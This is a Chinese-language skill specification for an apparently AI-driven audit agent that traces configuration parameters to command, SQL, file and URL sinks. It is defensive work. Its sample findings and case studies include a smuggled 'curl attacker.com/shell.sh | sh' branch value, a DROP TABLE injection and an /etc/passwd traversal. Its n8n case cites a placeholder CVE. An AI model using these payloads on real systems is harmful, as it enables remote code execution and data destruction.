---
name: config-env-analyzer
description: 配置/环境攻击面分析技能：检测配置参数传递到危险函数的路径、环境变量驱动的隐藏接口、Feature Flag控制的攻击面、开发配置泄露到生产环境的风险。
---

# 概述与边界

## 核心职责

- **聚焦**：将配置作为攻击面进行系统化审计
- **输出**：配置→系统操作路径 + 环境差异风险 + 隐藏接口清单
- **价值**：发现n8n git节点、工作流引擎、插件系统等配置驱动的漏洞

## 为什么配置是攻击面？

### 典型场景

```javascript
// 场景1: 工作流引擎（n8n风格）
const config = JSON.parse(req.body.workflow_config);
const branch = config.git_branch;
exec(`git clone -b ${branch} ...`);  // ❌ 配置参数→命令执行

// 场景2: 插件系统（WordPress/Jenkins风格）
const pluginConfig = getPluginSettings(pluginId);
const scriptPath = pluginConfig.script_path;
fs.readFileSync(scriptPath);  // ❌ 配置参数→文件读取

// 场景3: 数据源连接
const dbConfig = loadConfig('database.json');
const query = `SELECT * FROM ${dbConfig.table_name}`;  // ❌ 配置→SQL注入

// 场景4: 环境变量控制
if (process.env.DEBUG === 'true') {
    app.use('/debug', debugRouter);  // ❌ 生产环境泄露调试接口
}
```

---

## 分析范围

### ✅ 检测内容

| 维度 | 说明 | 风险 |
|------|------|------|
| **配置→危险函数** | 配置参数直接传递给exec/query/readFile | CRITICAL |
| **环境变量泄露** | DEBUG/DEV_MODE在生产环境启用 | HIGH |
| **Feature Flag** | 条件启用的隐藏接口、调试端点 | MEDIUM |
| **默认配置** | 框架默认配置未加固、默认凭证 | MEDIUM |
| **配置存储** | 配置文件权限、明文密钥 | HIGH |
| **配置校验** | 配置参数缺少白名单/格式验证 | HIGH |

### ❌ 明确不做

- 不执行配置参数的运行时修改
- 不分析配置参数的业务逻辑合理性
- 不深入分析具体漏洞利用（由对应analyzer完成）

---

## 配置来源识别

### 1. 配置文件

```yaml
config_files:
  json:
    - "*.json"
    - "config/*.json"
    - "settings/*.json"
    - ".vscode/settings.json"

  yaml:
    - "*.yaml", "*.yml"
    - "config.yml"
    - "docker-compose.yml"
    - ".github/workflows/*.yml"

  ini:
    - "*.ini"
    - "php.ini"
    - "config.ini"

  env:
    - ".env"
    - ".env.example"
    - ".env.production"

  xml:
    - "*.xml"
    - "pom.xml"
    - "web.xml"

  code:
    - "config.js"
    - "settings.py"
    - "application.properties"
```

### 2. UI表单配置

```yaml
ui_config_sources:
  workflow_engines:
    - "n8n workflow config"
    - "Airflow DAG config"
    - "Zapier zap config"
    - "Node-RED flow config"

  plugin_systems:
    - "WordPress plugin settings"
    - "Jenkins job config"
    - "Grafana datasource config"
    - "VS Code extension settings"

  admin_panels:
    - "Admin dashboard settings"
    - "System preferences"
    - "Integration configs"
```

### 3. 环境变量

```yaml
env_vars:
  dangerous:
    - "DEBUG"
    - "DEV_MODE"
    - "ENABLE_DEBUG"
    - "NODE_ENV=development"
    - "FLASK_DEBUG"

  sensitive:
    - "DATABASE_URL"
    - "API_KEY"
    - "SECRET_KEY"
    - "JWT_SECRET"
    - "AWS_ACCESS_KEY_ID"

  feature_flags:
    - "FEATURE_*"
    - "ENABLE_*"
    - "DISABLE_*"
```

### 4. 代码硬编码配置

```python
# 识别模式
hardcoded_config_patterns = [
    r"config\s*=\s*\{",  # config = { ... }
    r"settings\s*=\s*\{",
    r"const\s+CONFIG",
    r"Options\s*=\s*\{",
    r"@Configuration"
]
```

---

## 危险配置模式

### 模式1: 配置→命令执行

```yaml
pattern:
  name: "Config to Command Execution"
  severity: CRITICAL
  description: "配置参数未经验证直接传递给系统命令"

examples:
  - language: JavaScript
    code: |
      const config = loadWorkflowConfig(id);
      const branch = config.git_branch;
      exec(`git clone -b ${branch} ...`);

  - language: Python
    code: |
      config = load_config('worker.yaml')
      script = config['script_path']
      subprocess.run([script], shell=True)

  - language: Java
    code: |
      String cmd = config.getProperty("backup.command");
      Runtime.getRuntime().exec(cmd);

detection:
  sources:
    - "config.*"
    - "settings.*"
    - "process.env.*"
  sinks:
    - "exec", "spawn", "system", "shell_exec"
```

### 模式2: 配置→SQL查询

```yaml
pattern:
  name: "Config to SQL Injection"
  severity: HIGH
  description: "配置参数用于构造SQL查询（表名、列名等）"

examples:
  - language: Python
    code: |
      table = config['data_source']['table_name']
      query = f"SELECT * FROM {table}"  # ❌ 表名来自配置

  - language: JavaScript
    code: |
      const dbConfig = getDataSourceConfig(id);
      const sql = `SELECT ${dbConfig.columns} FROM users`;

detection:
  sources:
    - "config.*"
    - "dbConfig.*"
  sinks:
    - "db.query", "execute", "raw"
  dangerous_params:
    - "table_name"
    - "column_name"
    - "order_by"
```

### 模式3: 配置→文件路径

```yaml
pattern:
  name: "Config to Path Traversal"
  severity: HIGH
  description: "配置参数用于文件路径，可能导致路径遍历"

examples:
  - language: JavaScript
    code: |
      const pluginConfig = loadPluginSettings(id);
      const template = fs.readFileSync(pluginConfig.template_path);

  - language: Python
    code: |
      config = load_config()
      log_path = config['log_file']
      with open(log_path) as f:  # ❌ 路径来自配置

detection:
  sources:
    - "config.*"
    - "pluginConfig.*"
  sinks:
    - "fs.readFile", "fs.writeFile"
    - "open", "fopen"
  dangerous_params:
    - "*_path"
    - "*_file"
    - "*_directory"
```

### 模式4: 配置→HTTP请求（SSRF）

```yaml
pattern:
  name: "Config to SSRF"
  severity: HIGH
  description: "配置参数用于HTTP请求URL"

examples:
  - language: JavaScript
    code: |
      const webhookConfig = getWebhookSettings(id);
      const url = webhookConfig.callback_url;
      fetch(url);  # ❌ URL来自配置

detection:
  sources:
    - "config.*"
    - "webhookConfig.*"
  sinks:
    - "fetch", "axios.get", "http.request"
  dangerous_params:
    - "*_url"
    - "*_endpoint"
    - "callback_url"
```

---

## 环境差异检测

### 环境类型定义

```yaml
environments:
  development:
    indicators:
      - "NODE_ENV=development"
      - "FLASK_ENV=development"
      - "DEBUG=true"
      - "Rails.env.development?"
    expected_configs:
      - debug_mode: true
      - verbose_logging: true
      - hot_reload: true
    dangerous_in_prod:
      - "/debug/*" endpoints
      - stack traces in errors
      - source maps enabled

  testing:
    indicators:
      - "NODE_ENV=test"
      - "CI=true"
    expected_configs:
      - test_mode: true
      - mock_external_services: true

  production:
    indicators:
      - "NODE_ENV=production"
      - "RAILS_ENV=production"
    required_configs:
      - debug_mode: false
      - https_only: true
      - secure_headers: enabled
    forbidden_configs:
      - DEBUG: true
      - ENABLE_DEBUG: true
```

### 危险的环境配置组合

```yaml
dangerous_combinations:
  - name: "生产环境启用DEBUG"
    check: |
      NODE_ENV=production && DEBUG=true
    risk: "暴露调试端点、堆栈信息"
    severity: HIGH

  - name: "生产环境使用测试凭证"
    check: |
      NODE_ENV=production && DATABASE_URL contains 'localhost'
    risk: "配置错误可能暴露内部服务"
    severity: MEDIUM

  - name: "CORS配置过于宽松"
    check: |
      CORS_ORIGIN='*' in production
    risk: "允许任意域访问API"
    severity: MEDIUM
```

---

## Feature Flag隐藏接口

### Feature Flag模式

```yaml
feature_flag_patterns:
  # 1. 环境变量控制
  - pattern: |
      if (process.env.ENABLE_DEBUG) {
        app.use('/debug', debugRouter);
      }
    risk: "生产环境可能启用调试接口"

  # 2. 配置文件控制
  - pattern: |
      if (config.features.admin_api_enabled) {
        app.use('/api/admin', adminRouter);
      }
    risk: "配置泄露导致隐藏接口暴露"

  # 3. 条件注解（Java/Spring）
  - pattern: |
      @ConditionalOnProperty(name = "app.debug.enabled")
      @RestController
      public class DebugController { ... }
    risk: "条件满足时暴露额外端点"

  # 4. 装饰器（Python）
  - pattern: |
      @app.route('/admin')
      @feature_flag('admin_panel')
      def admin(): ...
    risk: "Feature flag误配置"
```

### 检测策略

```python
def detect_feature_flags(project_root):
    """检测Feature Flag控制的隐藏接口"""

    findings = []

    # 1. 搜索条件路由注册
    conditional_routes = grep_pattern(
        pattern=r"if\s*\(.*(env|config|feature).*\).*\.(use|route|get|post)",
        paths=["**/*.js", "**/*.py", "**/*.java"]
    )

    for route in conditional_routes:
        # 2. 提取条件表达式
        condition = extract_condition(route)

        # 3. 检查条件是否可被外部控制
        if is_externally_controllable(condition):
            findings.append({
                "type": "Feature Flag Hidden Route",
                "condition": condition,
                "route": route.path,
                "risk": "HIGH"
            })

    return findings
```

---

## 配置Schema分析

### Schema定义检测

```yaml
schema_locations:
  json_schema:
    - "schema.json"
    - "config.schema.json"

  typescript:
    - "interface Config { ... }"
    - "type Settings = { ... }"

  python:
    - "from pydantic import BaseModel"
    - "class Config(TypedDict): ..."

  java:
    - "@ConfigurationProperties"
    - "class ApplicationConfig { ... }"
```

### 危险的Schema字段

```python
dangerous_schema_fields = {
    "command": ["exec", "run", "script", "shell"],
    "path": ["file", "path", "directory", "template"],
    "url": ["url", "endpoint", "callback", "webhook"],
    "sql": ["table", "column", "query", "raw_sql"],
    "code": ["eval", "function", "expression"]
}
```

---

## 输出要求

### 1. 配置攻击面分析报告

**输出路径**：`.workspace/tasks/{TASK_ID}/config-env-analysis.json`

```json
{
  "dimension": "config-env",
  "scan_time": "2025-12-16T11:00:00Z",
  "statistics": {
    "total_config_sources": 23,
    "config_to_sink_paths": 8,
    "env_var_issues": 5,
    "feature_flags": 12,
    "hidden_endpoints": 3
  },

  "config_to_sink_paths": [
    {
      "id": "ce-001",
      "config_source": {
        "type": "workflow_config",
        "location": "workflow.json",
        "parameter": "git_branch",
        "schema": "{ git_branch: string, git_url: string }"
      },
      "sink": {
        "type": "command_execution",
        "function": "exec",
        "location": "src/nodes/git.js:78",
        "code": "exec(`git clone -b ${config.git_branch} ${config.git_url}`)"
      },
      "path": [
        "workflow.json:git_branch",
        "→ loadWorkflowConfig(id)",
        "→ config.git_branch",
        "→ exec(`git clone -b ${branch}`)"
      ],
      "validation": {
        "exists": false,
        "whitelist": null,
        "sanitization": null
      },
      "vulnerability": "Command Injection via Workflow Config",
      "severity": "CRITICAL",
      "poc": {
        "config": {
          "git_branch": "main; curl attacker.com/shell.sh | sh;"
        },
        "impact": "任意命令执行"
      },
      "cve_reference": "类似 n8n CVE-2023-XXXX"
    },
    {
      "id": "ce-002",
      "config_source": {
        "type": "datasource_config",
        "location": "config/database.json",
        "parameter": "table_name"
      },
      "sink": {
        "type": "sql_query",
        "function": "db.query",
        "location": "src/models/report.js:45"
      },
      "path": [
        "config/database.json:table_name",
        "→ getDatasourceConfig()",
        "→ buildQuery()",
        "→ db.query(`SELECT * FROM ${table}`)"
      ],
      "vulnerability": "SQL Injection via Config Parameter",
      "severity": "HIGH",
      "poc": {
        "config": {
          "table_name": "users; DROP TABLE users--"
        }
      }
    }
  ],

  "environment_issues": [
    {
      "id": "env-001",
      "type": "DEBUG mode in production",
      "config": "DEBUG=true",
      "location": ".env.production:12",
      "risk": "生产环境启用DEBUG导致以下风险",
      "impacts": [
        "暴露 /debug/* 调试端点",
        "错误信息包含堆栈跟踪",
        "source maps 暴露源代码"
      ],
      "severity": "HIGH",
      "recommendation": "在生产环境设置 DEBUG=false"
    },
    {
      "id": "env-002",
      "type": "Weak CORS policy",
      "config": "CORS_ORIGIN=*",
      "location": "config/app.js:23",
      "risk": "允许任意域访问API",
      "severity": "MEDIUM"
    }
  ],

  "feature_flags": [
    {
      "id": "ff-001",
      "condition": "process.env.ENABLE_ADMIN_API === 'true'",
      "location": "src/app.js:89",
      "exposed_routes": [
        "POST /api/admin/users/delete",
        "GET /api/admin/config",
        "PUT /api/admin/settings"
      ],
      "risk": "环境变量控制管理API暴露",
      "severity": "HIGH",
      "current_state": {
        "dev": true,
        "test": false,
        "prod": "unknown (检查 .env.production)"
      }
    },
    {
      "id": "ff-002",
      "condition": "config.features.experimental_mode",
      "location": "src/server.js:134",
      "exposed_routes": [
        "GET /experimental/debug",
        "POST /experimental/reset"
      ],
      "risk": "实验性功能未充分测试",
      "severity": "MEDIUM"
    }
  ],

  "default_configs": [
    {
      "framework": "Express.js",
      "issue": "trust proxy未配置",
      "location": "src/app.js",
      "risk": "X-Forwarded-* 头可被伪造",
      "severity": "MEDIUM",
      "fix": "app.set('trust proxy', 1)"
    }
  ],

  "sensitive_config_storage": [
    {
      "type": "硬编码密钥",
      "location": "config/jwt.js:12",
      "code": "const SECRET = 'hardcoded-jwt-secret'",
      "severity": "HIGH",
      "recommendation": "使用环境变量 process.env.JWT_SECRET"
    }
  ]
}
```

### 2. 环境差异对比表

**输出路径**：`.workspace/tasks/{TASK_ID}/env-comparison.md`

```markdown
# 环境配置差异分析

## 配置对比

| 配置项 | 开发环境 | 测试环境 | 生产环境 | 风险等级 |
|-------|---------|---------|---------|---------|
| DEBUG | ✅ true | ❌ false | ⚠️ true | 🔴 HIGH |
| NODE_ENV | development | test | production | ✅ OK |
| CORS_ORIGIN | * | * | * | 🟡 MEDIUM |
| SESSION_SECRET | 'dev' | 'test' | 'prod-123' | ✅ OK |
| ENABLE_ADMIN_API | true | false | ❓ 未知 | 🔴 HIGH |

## 高危配置

### 1. 生产环境启用DEBUG模式
- **位置**: `.env.production:12`
- **当前值**: `DEBUG=true`
- **风险**: 暴露调试端点、堆栈跟踪、源代码
- **修复**: 设置 `DEBUG=false`

### 2. CORS配置过于宽松
- **位置**: `config/app.js:23`
- **当前值**: `CORS_ORIGIN=*`
- **风险**: 允许任意域访问API
- **修复**: 限制为信任域名列表
```

### 3. 下游任务推荐

```json
{
  "tasks": [
    {
      "artifact": ".workspace/tasks/{TASK_ID}/config-env-analysis.json",
      "skill": "command-injection-analyzer",
      "context": {
        "focus_items": ["ce-001"],
        "reason": "工作流配置参数git_branch未经验证直接传递给exec()"
      }
    },
    {
      "artifact": ".workspace/tasks/{TASK_ID}/config-env-analysis.json",
      "skill": "sql-injection-analyzer",
      "context": {
        "focus_items": ["ce-002"],
        "reason": "数据源配置table_name用于构造SQL查询"
      }
    },
    {
      "artifact": ".workspace/tasks/{TASK_ID}/config-env-analysis.json",
      "skill": "security-configuration-analyzer",
      "context": {
        "focus_items": ["env-001", "env-002"],
        "reason": "环境配置存在安全隐患"
      }
    }
  ]
}
```

---

## 实现策略

### 阶段1: 配置源识别

```python
def identify_config_sources(project_root):
    """识别所有配置来源"""

    sources = []

    # 1. 扫描配置文件
    config_files = glob([
        "**/*.json", "**/*.yaml", "**/*.yml",
        "**/.env*", "**/config.js", "**/settings.py"
    ])

    for file in config_files:
        sources.append({
            "type": "config_file",
            "path": file,
            "format": detect_format(file)
        })

    # 2. 扫描环境变量引用
    env_refs = grep_pattern(
        r"process\.env\.\w+|os\.getenv\(|System\.getenv\(",
        paths=["**/*.js", "**/*.py", "**/*.java"]
    )

    for ref in env_refs:
        sources.append({
            "type": "env_var",
            "name": extract_env_name(ref),
            "location": ref.location
        })

    # 3. 扫描UI配置（workflow/plugin）
    ui_configs = detect_ui_configs(project_root)

    sources.extend(ui_configs)

    return sources
```

### 阶段2: 配置→Sink追踪

```python
def trace_config_to_sink(config_source):
    """追踪配置参数到危险函数的路径"""

    # 1. 加载配置Schema
    schema = load_config_schema(config_source)

    # 2. 对每个配置参数追踪
    for param in schema.keys():
        # 3. 查找参数的使用位置
        usages = find_config_usage(param)

        for usage in usages:
            # 4. 检查是否流向危险Sink
            sink = check_if_dangerous_sink(usage)

            if sink:
                # 5. 验证是否有校验/净化
                if not has_validation(param, sink):
                    yield ConfigToSinkVulnerability(
                        param=param,
                        source=config_source,
                        sink=sink,
                        path=trace_path(param, sink)
                    )
```

### 阶段3: 环境差异分析

```python
def compare_environments():
    """对比不同环境的配置差异"""

    envs = {
        "dev": load_env_config(".env.development"),
        "test": load_env_config(".env.test"),
        "prod": load_env_config(".env.production")
    }

    issues = []

    # 检查危险配置在生产环境的状态
    dangerous_configs = ["DEBUG", "ENABLE_DEBUG", "DEV_MODE"]

    for config in dangerous_configs:
        if envs["prod"].get(config) == "true":
            issues.append({
                "config": config,
                "risk": f"{config}=true in production",
                "severity": "HIGH"
            })

    return issues
```

---

## 与其他维度的协作

### 前置依赖

- **project-profiler**: 识别项目类型（工作流引擎、插件系统等）
- **dataflow-analyzer**: 提供数据流图，用于追踪配置传播

### 后置触发

- **command-injection-analyzer**: 深入分析配置→命令执行
- **sql-injection-analyzer**: 深入分析配置→SQL查询
- **path-traversal-analyzer**: 深入分析配置→文件路径

### 数据共享

```json
{
  "shared_data": {
    "config_graph": ".workspace/tasks/{TASK_ID}/config-env-analysis.json",
    "usage": "其他analyzer可以引用此文件获取配置攻击面信息"
  }
}
```

---

## 重要约束

1. ⚠️ **配置可信性假设**：不假设配置"可信"，配置同样是攻击面
2. ⚠️ **环境检测**：准确区分开发/测试/生产环境
3. ⚠️ **Schema识别**：尽可能识别配置Schema，了解参数类型
4. ✅ **误报控制**：配置参数到Sink的追踪可能有误报，标注confidence

---

## 经典漏洞案例

### 案例1: n8n Git Node RCE

```yaml
case_study:
  cve: "CVE-2023-XXXX"
  title: "n8n Workflow Config Command Injection"

  vulnerable_code: |
    // n8n/packages/nodes-base/nodes/Git/Git.node.ts
    const branch = this.getNodeParameter('branch') as string;
    const command = `git clone -b ${branch} ${repository}`;
    await exec(command);

  attack:
    config: |
      {
        "branch": "main; curl attacker.com/shell.sh | bash;"
      }
    impact: "RCE as workflow execution user"

  lesson: "工作流配置参数必须严格验证，或使用参数化执行"
```

### 案例2: Grafana Plugin Path Traversal

```yaml
case_study:
  cve: "CVE-2021-43798"
  title: "Grafana Plugin Config Path Traversal"

  vulnerable_code: |
    function getPluginAsset(pluginId, file) {
      const pluginPath = path.join('/var/lib/grafana/plugins', pluginId);
      const assetPath = path.join(pluginPath, file);
      return fs.readFileSync(assetPath);
    }

  attack:
    config: |
      pluginId: "alertlist"
      file: "../../../../etc/passwd"

  lesson: "插件配置的文件路径必须规范化并限制在插件目录内"
```

---

## 参考资料

- [OWASP Configuration Hardening](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [n8n Security Advisories](https://github.com/n8n-io/n8n/security/advisories)
- [Grafana CVE-2021-43798](https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/)
